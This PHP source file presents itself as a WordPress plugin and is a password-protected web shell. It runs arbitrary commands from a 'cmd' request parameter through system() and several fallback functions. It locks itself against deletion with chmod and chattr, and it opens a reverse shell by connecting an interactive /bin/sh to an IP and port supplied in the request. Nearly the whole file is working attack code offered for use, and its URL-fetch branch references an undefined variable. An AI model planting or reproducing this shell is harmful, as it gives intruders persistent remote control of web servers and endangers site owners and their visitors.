<?php
    /*
    Plugin Name: Password Protected Wordpress Shell
    Plugin URI: https://github.com/random-robbie/wp-theshell/
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/wp-theshell/index.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/wp-theshell/index.php?cmd=id&pass=e5bd68701aeec2072ecfd25885692620", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Leon Jacobs & Robbie Wiggins
    Version: 0.1
    Author URI: https://github.com/random-robbie/
    */


if (!isset($_REQUEST['pass'])) {
  exit();
}
# Set you password here!
if(($_REQUEST['pass'] != "e5bd68701aeec2072ecfd25885692620")) {
echo "Pass is incorrect";
exit();

}
# attempt to protect myself from deletion
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
$cmd = 'cmd';

# test if parameter 'cmd', 'ip or 'port' is present. If not this will avoid an error on logs or on all pages if badly configured.
if(isset($_REQUEST[$cmd])) {

    # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
    $command = $_REQUEST[$cmd];
    executeCommand($command);

} else if(isset($_REQUEST['ip']) && !isset($_REQUEST['cmd'])) {

    $ip = $_REQUEST['ip'];

    # default port 443
    $port = '443';

    if(isset($_REQUEST['ip'])){
        $port = $_REQUEST['port'];
    }

    # nc -nlvp 443
    $sock = fsockopen($ip,$port);
    $command = '/bin/sh -i <&3 >&3 2>&3';

    executeCommand($command);

}

if (isset($_REQUEST['url'])){

$a = file_get_contents($url);
echo $a;
exit();
}





die();

function executeCommand(string $command) {

     # Try to find a way to run our command using various PHP internals
    if (class_exists('ReflectionFunction')) {

       # http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);

    } elseif (function_exists('call_user_func_array')) {

       # http://php.net/manual/en/function.call-user-func-array.php
       call_user_func_array('system', array($command));

    } elseif (function_exists('call_user_func')) {

       # http://php.net/manual/en/function.call-user-func.php
       call_user_func('system', $command);

    } else if(function_exists('passthru')) {

       # https://www.php.net/manual/en/function.passthru.php
       ob_start();
       passthru($command , $return_var);
       $output = ob_get_contents();
       ob_end_clean();

    } else if(function_exists('system')){

       # this is the last resort. chances are PHP Suhosin
       # has system() on a blacklist anyways :>

       # http://php.net/manual/en/function.system.php
       system($command);
    }
}
